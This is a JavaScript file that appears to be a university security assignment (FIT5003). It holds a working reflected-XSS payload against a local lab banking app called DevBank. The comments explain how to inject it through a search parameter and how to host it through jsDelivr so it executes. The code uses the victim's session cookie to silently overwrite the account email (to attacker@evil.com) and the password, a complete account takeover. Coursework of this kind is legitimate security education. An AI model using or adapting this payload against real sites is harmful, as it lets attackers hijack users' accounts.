// FIT5003 A2 — Part B.2 external reflected-XSS payload.
//
// Delivered via a reflected <script src="..."> injected into DevBank's
// /search?q= sink. It runs in the LOGGED-IN VICTIM's browser, in the
// DevBank origin (http://127.0.0.1:5000), so the victim's `auth` session
// cookie is attached automatically to the request below — no password
// needed. This is a full account takeover: it rewrites the victim's
// email AND password through the normal /profile update feature.
//
// Host this file on your own PUBLIC GitHub repo and load it through a CDN
// (jsDelivr) so it is served with a JavaScript content-type:
//   https://cdn.jsdelivr.net/gh/alan66603/<repo>@main/payload.js
// (A raw GitHub URL is served as text/plain + nosniff and will NOT run.)

(function () {
  // The attacker-controlled new credentials.
  var body = "email=attacker@evil.com&password=pwned-by-xss";

  fetch("/profile", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    credentials: "include",          // send the victim's session cookie
    body: body
  })
    .then(function () {
      // Proof the attack fired (visible in the victim's console).
      console.log("[B.2 payload] victim account overwritten via /profile");
      // Optional louder proof during the live demo:
      alert("Account taken over: email/password changed via reflected XSS");
    })
    .catch(function (e) {
      console.log("[B.2 payload] request failed:", e);
    });
})();
